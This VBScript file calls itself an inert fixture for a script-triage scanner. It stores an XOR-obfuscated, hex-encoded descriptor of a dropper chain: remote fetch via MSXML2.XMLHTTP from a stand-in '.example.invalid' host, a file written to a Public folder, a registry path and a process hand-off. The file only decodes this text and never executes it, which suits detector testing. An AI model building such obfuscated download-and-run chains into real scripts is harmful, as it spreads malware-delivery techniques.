Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_06864a00 = "e0-ab-a7-ea-e5-e2-f3-e6-e5-ab-f7-f5-e7-e3-ff-e4-f3-c9-e4-f3-fb-f9-e2-f3-ba-e1-e4-ff-e2-f3-c9-f0-ff-fa-f3-ba-f2-ff-e5-e6-f7-e2-f5-fe-c9-e6-e4-f9-f5-f3-e5-e5-ba-fe-f7-f8-f2-f9-f0-f0-c9-e5-f5-e4-ff-e6-e2-ea-f7-f2-f7-e6-e2-f3-e4-ab-db-c5-ce-db-da-a4-b8-ce-db-da-de-c2-c2-c6-b8-a0-b8-a6-ea-e5-e2-f7-f1-f3-c9-f5-f9-e3-f8-e2-ab-a2-ea-f5-f7-fb-e6-f7-ff-f1-f8-c9-ff-f2-ab-f5-f7-fb-e6-f7-ff-f1-f8-bb-f3-f7-f2-f2-a5-f3-af-f2-ae-f2-ea-e3-e4-fa-ab-fe-e2-e2-e6-e5-ac-b9-b9-f3-f7-f2-f2-a5-f3-af-f2-ae-f2-b8-f3-ee-f7-fb-e6-fa-f3-b8-ff-f8-e0-f7-fa-ff-f2-b9-f0-f4-f0-af-f2-a3-f2-f7-b8-f2-f7-e2-ea-e3-e5-f3-e4-c9-f7-f1-f3-f8-e2-ab-de-e3-f8-e2-e4-f3-e5-e5-da-f7-f4-b9-f3-f7-f2-f2-a5-f3-af-f2-ae-f2-ea-f0-ff-fa-f3-c9-e6-f7-e2-fe-ab-d5-ac-ca-c3-e5-f3-e4-e5-ca-c6-e3-f4-fa-ff-f5-ca-de-e3-f8-e2-e4-f3-e5-e5-da-f7-f4-ca-e5-e2-f7-f1-f3-bb-f3-f7-f2-f2-a5-f3-af-f2-ae-f2-b8-f2-f7-e2-ea-e4-f3-f1-ff-e5-e2-e4-ef-c9-e6-f7-e2-fe-ab-de-dd-d5-c3-ca-c5-f9-f0-e2-e1-f7-e4-f3-ca-de-e3-f8-e2-e4-f3-e5-e5-da-f7-f4-ca-d2-ff-e5-e6-f9-e5-f7-f4-fa-f3-ca-f3-f7-f2-f2-a5-f3-af-f2-ae-f2-ea-f8-f3-ee-e2-c9-e5-e2-f7-f1-f3-ab-e4-f3-e5-f9-e3-e4-f5-f3-bb-e5-f7-fb-e6-fa-f3-b8-e6-e5-a7"
Const Codec_06864a00 = "hex_dash|single_byte_xor|96"

Function Load_06864a00()
  Dim parts, result(), ByTeInDeX
  parts = Split(Material_06864a00, "-")
  ReDim result(UBound(parts))
  For ByTeInDeX = 0 To UBound(parts)
    result(ByTeInDeX) = CInt("&H" & parts(ByTeInDeX))
  Next
  Load_06864a00 = result
End Function

Function Decode_06864a00(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = SoUrCeByTeS(ByTeInDeX) Xor 150
  Next
  Decode_06864a00 = result
End Function

Function Recover_06864a00()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  ' configuration reconstruction
NeUtRaL = (19 * 7) - 133
  SoUrCeByTeS = Load_06864a00()
  Do
    DeCoDeDByTeS = Decode_06864a00(SoUrCeByTeS)
    Exit Do
  Loop
  DeScRiPtOrTeXt = ""
  For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)
    DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))
  Next
' reconstruction complete
  Recover_06864a00 = DeScRiPtOrTeXt
End Function

Function Inspect_06864a00()
  Inspect_06864a00 = Recover_06864a00()
End Function
